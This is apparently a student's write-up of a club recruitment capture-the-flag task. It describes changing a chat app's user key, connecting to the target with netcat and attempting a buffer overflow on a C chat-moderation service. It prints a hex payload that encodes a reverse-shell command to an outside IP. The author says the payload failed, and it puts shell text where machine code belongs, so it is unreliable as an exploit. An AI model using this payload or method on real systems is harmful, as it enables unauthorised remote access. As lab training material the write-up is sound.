# Y22 Secy Recruitment **PClub**
## Task 4- **INFOSEC**
***
<br>

We were provided with **IP Address**  `20.120.1.205` We were informed that **Buffer Overflow** Vulnerability was inserted in the code in the **Chat Moderation System** of the computer systems.  
We have to do the following tasks :-
1. Gain access to the Group's REAL Chat Server 
2. Gain access to its shell
<br>

First of all I opened the website using the IP address and saw that there was a chat system first of all and There were two Tabs one for the **Login** and other for the **Contact Admin**. I thought of using **SQL injection** but It didn't work. We thoought then to observe the request and response sent and recieved by the website Using **Burpsuite**. We Typed a message in the burpsuite and sent it. I saw it was sent with a key **13515** I tried this on another computer system but and got the same key. I observed that intially **@jizzy_str** his name appeared in the chatbox then he must have been identified with some another key. From the HTTP Request I got  his key as **13516** . I sent my message with the same key and **Bravo!!** I got
```
"success":"Use command nc 20.169.188.75 5134 in terminal to connect to the vulnerable port of the server"
```
Next I connected to the the port 
```
$ nc 20.169.188.75 5134
```
From here I got into their **CHAT Moderation Firewall** I got the source code from https://bit.ly/anon_script. From here I first downloaded the **Source code**. Then using the link https://bit.ly/anon_setup I downloaded the **exec.sh** file . Then I setted it up to run the test environment on my own system as the host  
```
 $ bash ./exec.sh
 $ nc localhost 5134
 ```
The above commands were used to simulate the environment locally. 
Moreover, I fixed the **syntax error** that was present in the code. I found that **"Report.h"** wasn't a C template Library . It must be running on the REAL server. So I commented it out. I also encounterd the problem in where get() function was not getting compiled cause it was removed from c11 standard due to its vunrebility. so i have to figured that out too. finally i found out givimg additional argument to g++ **-std=c99** in setup.sh made it possible to compile using c99. 

After that i tried to buffer overflow. intially the key had allocated 16 byte.
no matter how many character i typed out i was not able to change value of EIP pointer. Becaue ASLR was on in my system, so i turned it off using code from Google.

next i was able to see that after 24 char anything that i give was written in EIP. to check my theory i made a function inside Script.h. it was simple function to print a string. but i didnt called that function in main. Insted i used a payload and using the address of the function i was able call that function and print it.So it worked.

Now in Real Server by hit and trail i figured out 120 A character crash it
and equivalent array size i figured out was 100. using the server code.

now i desigened the payload to get reverese shell access. but for some reason it was not working.

so logic was this 120byte write till EBP pointer and after that it will be writing on EIP pointer where i put the address of starting of ESP. 
79 byte contain "x90" for no operation , 41 byte contain shell code and the left 6 byte we used for adress of start of Stack pointer.

for genrating the reverse shell code i used online genrator using my ip.

```
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x73\x68\x20\x2D\x69\x20\x3E\x26\x20\x2F\x64\x65\x76\x2F\x74\x63\x70\x2F\x31\x34\x2E\x31\x33\x39\x2E\x33\x38\x2E\x31\x37\x36\x2F\x39\x30\x30\x31\x20\x30\x3E\x26\x31\x80\xdd\xff\xff\xff\x7f
```

the last 6 byte was start of stack pointer so it put it into EIP.

